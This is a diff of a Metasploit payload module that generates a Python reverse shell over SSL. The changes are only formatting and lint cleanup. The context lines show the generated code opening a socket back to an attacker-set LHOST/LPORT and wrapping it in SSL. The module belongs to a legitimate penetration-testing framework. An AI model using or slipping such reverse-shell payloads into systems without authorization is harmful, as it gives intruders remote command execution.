@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 561
 
   include Msf::Payload::Single
@@ -17,21 +17,20 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Command Shell, Reverse TCP SSL (via python)',
-      'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
-      'Author'        => 'RageLtMan',
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'python',
-      'Arch'          => ARCH_PYTHON,
-      'Handler'       => Msf::Handler::ReverseTcpSsl,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'python',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+                     'Name'          => 'Command Shell, Reverse TCP SSL (via python)',
+                     'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
+                     'Author'        => 'RageLtMan',
+                     'License'       => BSD_LICENSE,
+                     'Platform'      => 'python',
+                     'Arch'          => ARCH_PYTHON,
+                     'Handler'       => Msf::Handler::ReverseTcpSsl,
+                     'Session'       => Msf::Sessions::CommandShell,
+                     'PayloadType'   => 'python',
+                     'Payload'       =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       }))
   end
 
   #
@@ -50,7 +49,7 @@ module MetasploitModule
     # Set up the socket
     cmd += "import socket,subprocess,os,ssl\n"
     cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
-    cmd += "so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
+    cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
     cmd += "s=ssl.wrap_socket(so)\n"
     # The actual IO
     cmd += "#{dead}=False\n"
@@ -67,4 +66,3 @@ module MetasploitModule
     cmd
   end
 end
-
